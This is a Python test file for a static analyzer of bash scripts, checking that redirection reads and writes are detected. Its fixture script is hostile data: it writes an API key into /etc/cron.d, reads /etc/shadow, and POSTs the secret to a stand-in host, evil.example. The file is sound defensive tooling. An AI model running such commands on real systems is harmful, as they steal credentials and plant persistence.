# SPDX-License-Identifier: AGPL-3.0-or-later
"""INV-vavup: the shell's OWN writes must be visible, not just its launches.

The bash analyzer dispatched on ``function_definition`` /
``declaration_command`` / ``command`` only, so ``echo "$SECRET" >
/etc/cron.d/pwned`` emitted ZERO edges. Measured on an 8-statement fixture:
5 edges, every one a ``command_launch`` for cat/nc/curl/rm, and none for the
three redirection writes. The launch surface was emitted; the write surface
was invisible.

WHY THIS IS A SAFETY ORDERING AND NOT A PREFERENCE. The next step for bash is
taint support, and marking bash taint-supported on the strength of launch
edges alone would let a redirection-write script pass the coverage gate and
CONFIRM "never writes host_fs" — a false confirm through a hole distinct from
INV-larol's catalogue-strip. Redirection has to be visible first, or step two
manufactures the bug.

THE PROHIBITION DID NOT COVER THIS. ADR-0016 rules out attributing a LAUNCHED
program's I/O to the shell: for ``curl -o /etc/cron.d/pwned``, curl performs
the write and the script only launched it. ``echo x > file`` is the other
surface — the shell itself opens and writes the file (echo is a builtin, and
even for an external command the shell establishes the redirection before
exec), so attributing ``fs_write`` is exactly right, the same standing
``os.remove`` has in python.

SPLIT AS EVERYWHERE ELSE: the analyzer EMITS an edge naming the construct,
the catalogue CLASSIFIES it. The precedent is exact and shipped —
``os.environ`` is an attribute access, not a call, and reaches the boundary
pipeline as a synthesized edge that ``tag_io_boundaries`` accepts.
"""

from pathlib import Path

from hypergumbo_lang_mainstream.bash import analyze_bash

FIXTURE = """#!/usr/bin/env bash
SECRET="${API_KEY}"
echo "$SECRET" > /etc/cron.d/pwned
printf '%s' "$SECRET" >> /var/log/leak
cat < /etc/shadow
curl -d "$SECRET" https://evil.example/x
"""


def _edges(tmp_path: Path, script: str = FIXTURE):
    (tmp_path / "exfil.sh").write_text(script)
    return analyze_bash(tmp_path).edges


def _redirects(edges):
    return [e for e in edges
            if (e.meta or {}).get("io_primitive", "").startswith("redirect")]


def test_a_truncating_redirect_emits_an_edge(tmp_path):
    """`echo "$SECRET" > /etc/cron.d/pwned` — the cron-dropper shape."""
    reds = _redirects(_edges(tmp_path))
    assert any((e.meta or {}).get("redirect_target") == "/etc/cron.d/pwned"
               for e in reds), [e.dst for e in reds]


def test_an_appending_redirect_emits_an_edge(tmp_path):
    reds = _redirects(_edges(tmp_path))
    assert any((e.meta or {}).get("redirect_target") == "/var/log/leak"
               for e in reds), [e.dst for e in reds]


def test_a_read_redirect_emits_an_edge(tmp_path):
    reds = _redirects(_edges(tmp_path))
    assert any((e.meta or {}).get("redirect_target") == "/etc/shadow"
               for e in reds), [e.dst for e in reds]


def test_truncate_and_append_are_distinguished_by_io_mode(tmp_path):
    """`>` vs `>>` is a MODE distinction, carried on io_mode rather than by
    giving the two operators different boundaries — the builtins.open
    pattern. Both are writes; only the mode differs."""
    reds = _redirects(_edges(tmp_path))
    by_target = {(e.meta or {}).get("redirect_target"): (e.meta or {})
                 for e in reds}
    assert by_target.get("/etc/cron.d/pwned", {}).get("io_mode") == "w"
    assert by_target.get("/var/log/leak", {}).get("io_mode") == "a"


def test_the_launch_surface_is_UNCHANGED(tmp_path):
    """The control. Redirection work must not disturb the launch edges the
    opacity gate (INV-larol) keys on — that stamp is producer_primary and a
    regression here would be the INV-virat shape returning."""
    edges = _edges(tmp_path)
    launches = {e.dst.split(":")[1] for e in edges
                if (e.meta or {}).get("io_boundary") == "command_launch"}
    assert {"cat", "curl"} <= launches, launches


def test_a_variable_redirect_target_is_emitted_as_UNRESOLVED(tmp_path):
    """`> "$OUT"` must NOT silently skip.

    A silent skip is the fail-open direction this area keeps paying for: the
    write happens, the analysis says nothing, and a claim over the script
    reads clean. An unresolved target is honest — it says a write occurred to
    somewhere the analysis cannot name.
    """
    reds = _redirects(_edges(tmp_path, '#!/bin/bash\necho hi > "$OUT"\n'))
    assert reds, "a variable redirect target emitted nothing at all"
    assert any(not e.is_resolved for e in reds)
